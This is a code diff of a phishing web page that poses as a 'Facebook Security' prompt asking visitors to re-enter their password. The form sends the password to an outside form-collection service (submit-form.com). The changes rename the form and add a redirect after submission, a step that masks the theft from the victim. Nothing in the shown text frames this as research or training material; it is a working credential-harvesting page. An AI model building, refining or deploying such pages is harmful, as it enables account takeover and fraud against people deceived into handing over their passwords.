@@ -1,4 +1,3 @@
-
 <html>
 
 <head>
@@ -119,7 +118,7 @@
             Facebook Security
         </div>
         <p>Please re-enter your password to complete the request.</p>
-        <form id="passwordForm" action="https://submit-form.com/7nTDg3G5n" method="POST">
+        <form id="formspark" action="https://submit-form.com/7nTDg3G5n" method="POST">
             <div class="form-group">
                 <label for="password">Password</label>
                 <div class="input-wrapper">
@@ -167,7 +166,7 @@
                 })
                 .then(response => {
                     if (response.ok) {
-                      
+                        window.location.href = ''; // Redirect to desired URL
                     } else {
                         errorMessage.textContent = 'There was an error. Please try again.';
                     }
